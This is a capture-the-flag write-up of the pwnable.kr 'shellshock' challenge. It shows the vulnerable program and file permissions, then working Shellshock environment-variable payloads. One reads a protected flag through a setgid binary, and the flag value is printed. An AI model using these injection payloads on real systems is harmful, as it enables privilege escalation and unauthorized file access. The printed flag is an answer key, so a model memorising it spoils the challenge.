---
title: "pwnable.kr - shellshock"
classes: wide
tag: 
  - "shellshock"
header:
  teaser: /assets/images/pwn/pwn.png
ribbon: green
description: "A simple challenge related to shellshock vulnerability"
categories:
  - Pwn
---

Lets view the source code for this program

```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

So this binary uses ```Effective Group ID``` for its ```UID``` and ```GID```

Lisiting the files with their permission,

```c
shellshock@pwnable:~$ ls -la
total 980
drwxr-x---   5 root shellshock       4096 Oct 23  2016 .
drwxr-xr-x 115 root root             4096 Dec 22  2020 ..
-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
d---------   2 root root             4096 Oct 12  2014 .bash_history
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi
drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
```

So the ```flag``` and ```shellshock``` are owned by the same user ```root``` and group ```shellshock_pwn```

```Shellshock``` is a famous bash shell vulnerability, for more [reference](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)

Lets try running the program normally,

```c
shellshock@pwnable:~$ ./shellshock 
shock_me
```

Lets test for shellshock vulnerability in this bash shell

```c
shellshock@pwnable:~$ env x='() { :; }; echo monish' bash -c echo hacked

shellshock@pwnable:~$ env x='() { :; }; echo monish' ./bash -c echo hacked
monish

```

So there is no ```shellshock``` in the system's bash

But there is a ```shellshock``` vulnerability in ```/home/shellshock/bash```, since it printed the value enclosed inside the single quote

Lets try to read the flag

```c
shellshock@pwnable:~$ env x='() { :; }; /bin/cat flag' ./bash -c echo hacked
/bin/cat: flag: Permission denied
Segmentation fault (core dumped)
```

It because of the permission error

Lets try it with ```shellshock``` binary, since they are under the same permission it should display the flag

```c
shellshock@pwnable:~$ env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
```

Yay!! we got the flag ```only if I knew CVE-2014-6271 ten years ago..!!```

